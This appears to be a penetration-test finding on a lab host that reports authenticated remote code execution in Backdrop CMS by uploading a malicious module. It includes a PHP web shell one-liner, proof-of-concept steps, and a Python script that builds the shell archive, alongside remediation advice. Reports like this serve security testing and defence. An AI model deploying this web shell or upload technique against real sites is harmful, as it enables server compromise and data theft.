# Backdrop CMS Authenticated Remote Code Execution via Malicious Module Upload

**ID:** vuln-0002
**Severity:** CRITICAL
**Found:** 2026-02-28 07:54:16 UTC
**Target:** http://dog.htb/?q=admin/installer/manual
**CWE:** CWE-434
**CVSS:** 9.1

## Description

Backdrop CMS allows administrators to install modules by uploading a `.tar.gz` archive. This feature can be abused by an authenticated administrator to upload a malicious module containing a PHP web shell, leading to Remote Code Execution (RCE) on the server.

The target application (Backdrop CMS 1.27.1) was found to be vulnerable to this vector. A malicious module named `shell.tar.gz` containing `shell.info` and `shell.php` was successfully uploaded and installed via the manual installation feature (`admin/installer/manual`), allowing arbitrary command execution in the context of the `www-data` user.

## Impact

An authenticated attacker with module installation privileges can execute arbitrary commands on the underlying operating system, potentially leading to full server compromise, data exfiltration, or lateral movement within the network.

## Technical Analysis

Backdrop CMS allows the installation of modules via the manual installer. When a module is uploaded, it is extracted into the `modules` directory. If the module contains executable PHP files (like a web shell), these files can be accessed directly from the web root.

In this instance, a `.tar.gz` archive containing a minimal Backdrop module (`type = module` in `.info` file) and a PHP shell (`<?php system($_GET['cmd']); ?>`) was uploaded. The CMS successfully extracted it, making the shell accessible at `http://dog.htb/modules/shell/shell.php`.

## Proof of Concept

1. Authenticate to the Backdrop CMS with a user that has module installation privileges (e.g., `tiffany`).
2. Create a malicious module archive `shell.tar.gz` containing `shell/shell.info` and `shell/shell.php`.
3. Navigate to `http://dog.htb/?q=admin/installer/manual`.
4. Upload `shell.tar.gz`.
5. Trigger the installation batch process.
6. Access the web shell at `http://dog.htb/modules/shell/shell.php?cmd=id` to execute arbitrary commands.

```
import requests
from bs4 import BeautifulSoup
import re
import tarfile

# Create the malicious module
info_content = """
type = module
name = shell
description = Shell
package = Layouts
version = BACKDROP_VERSION
backdrop = 1.x
"""
with open("shell.info", "w") as f: f.write(info_content)
with open("shell.php", "w") as f: f.write("<?php system($_GET['cmd']); ?>")

with tarfile.open("shell.tar.gz", "w:gz") as tar:
    tar.add("shell.info", arcname="shell/shell.info")
    tar.add("shell.php", arcname="shell/shell.php")

# (Authentication and upload steps are executed via requests here)
# After upload:
# res = requests.get("http://dog.htb/modules/shell/shell.php?cmd=id")
# print(res.text)
```

## Remediation

1. Restrict administrative privileges, especially the ability to install modules, to trusted personnel only.
2. Disable the module installation interface (`admin/installer/manual`) in production environments via configuration or permissions.
3. Use file system permissions to prevent the web server from writing executable files to the `modules` directory.
